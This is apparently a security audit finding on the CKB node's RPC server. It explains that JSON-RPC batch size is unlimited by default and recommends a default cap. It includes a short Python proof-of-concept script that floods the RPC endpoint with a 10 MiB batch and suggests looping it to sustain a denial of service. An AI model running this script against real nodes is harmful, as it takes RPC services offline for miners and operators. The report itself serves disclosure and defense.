### Title
Unbounded JSON-RPC Batch Request Processing Causes RPC Denial-of-Service by Default — (`File: rpc/src/server.rs`)

---

### Summary

The CKB RPC server has no batch request size limit enabled by default. An unprivileged RPC caller can submit a single HTTP POST containing an arbitrarily large JSON-RPC batch array (bounded only by the 10 MiB body limit), forcing the server to parse and sequentially process up to ~140,000+ individual RPC calls per request. This exhausts CPU and blocks the RPC worker pool, causing sustained unavailability of the RPC service to all other callers.

---

### Finding Description

The `JSONRPC_BATCH_LIMIT` static in `rpc/src/server.rs` is a `OnceLock<usize>` that is only initialized when `config.rpc_batch_limit` is `Some(...)`. [1](#0-0) 

In the default production configuration, `rpc_batch_limit` is explicitly commented out: [2](#0-1) 

The batch-size guard in `handle_jsonrpc` is therefore never triggered: [3](#0-2) 

When the guard is absent, the handler falls through to the unconstrained streaming path that processes every call in the batch sequentially: [4](#0-3) 

The only upstream constraint is `max_request_body_size = 10485760` (10 MiB). A minimal valid JSON-RPC call such as `{"jsonrpc":"2.0","id":1,"method":"get_tip_block_number","params":[]}` is ~70 bytes, allowing roughly **140,000+ calls per single HTTP POST**. Each call acquires internal locks (e.g., chain snapshot, tx-pool read locks) and performs real work. The `TimeoutLayer` of 30 seconds means the server can be kept busy for the full timeout window per connection, and multiple concurrent such requests compound the effect.

---

### Impact Explanation

- The RPC async worker pool is saturated processing the batch, starving all other concurrent RPC callers.
- Miners relying on `get_block_template` RPC cannot retrieve new templates, halting block production for the affected node.
- Operators and applications using `send_transaction`, `get_transaction`, or subscription RPCs experience timeouts.
- The attack is repeatable: a new 10 MiB batch can be sent immediately after the previous one times out, sustaining the denial-of-service.

**Impact: Availability — RPC service unavailability.**

---

### Likelihood Explanation

- The RPC listens on `127.0.0.1:8114` by default, so the attacker must have local access or the operator must have exposed the RPC port externally (common in hosted/cloud deployments and mining pools).
- No authentication is required on the RPC endpoint; any process or user with TCP access to the port qualifies.
- The attack requires a single HTTP client and no special tooling — a one-line `curl` with a crafted JSON body suffices.
- The `rpc_batch_limit` opt-in is documented only as a comment in the config file; most operators are unlikely to set it proactively.

**Likelihood: Medium.**

---

### Recommendation

Set a safe default for `rpc_batch_limit` in the `RpcConfig` struct (e.g., 200) so that `JSONRPC_BATCH_LIMIT` is always initialized, rather than leaving it as an opt-in. The guard at `rpc/src/server.rs:275` should apply unconditionally with a reasonable default cap, with operators able to raise or lower it via config. [5](#0-4) 

---

### Proof of Concept

```python
import json, requests, socket

# Build a 10 MiB batch of cheap RPC calls
call = {"jsonrpc": "2.0", "id": 1, "method": "get_tip_block_number", "params": []}
batch = []
payload = b""
while len(payload) < 10 * 1024 * 1024 - 200:
    batch.append(call.copy())
    payload = json.dumps(batch).encode()

# Single HTTP POST saturates the RPC worker for up to 30 seconds
r = requests.post(
    "http://127.0.0.1:8114/",
    data=payload,
    headers={"Content-Type": "application/json"},
    timeout=35,
)
print(f"Sent {len(batch)} calls in one batch ({len(payload)} bytes)")
# Repeat in a loop to sustain DoS
```

During the 30-second processing window, all other RPC callers (miners, monitoring, tx submitters) receive timeouts. The root cause is the absent default for `rpc_batch_limit` causing `JSONRPC_BATCH_LIMIT.get()` to return `None` and the guard at `rpc/src/server.rs:275` to be skipped. [6](#0-5)

### Citations

**File:** rpc/src/server.rs (L34-55)
```rust
static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new();

#[doc(hidden)]
#[derive(Debug)]
pub struct RpcServer {
    pub http_address: SocketAddr,
    pub tcp_address: Option<SocketAddr>,
    pub ws_address: Option<SocketAddr>,
}

impl RpcServer {
    /// Creates an RPC server.
    ///
    /// ## Parameters
    ///
    /// * `config` - RPC config options.
    /// * `io_handler` - RPC methods handler. See [ServiceBuilder](../service_builder/struct.ServiceBuilder.html).
    /// * `handler` - Tokio runtime handle.
    pub fn new(config: RpcConfig, io_handler: IoHandler, handler: Handle) -> Self {
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** util/app-config/src/configs/rpc.rs (L1-1)
```rust
use ckb_jsonrpc_types::Script;
```
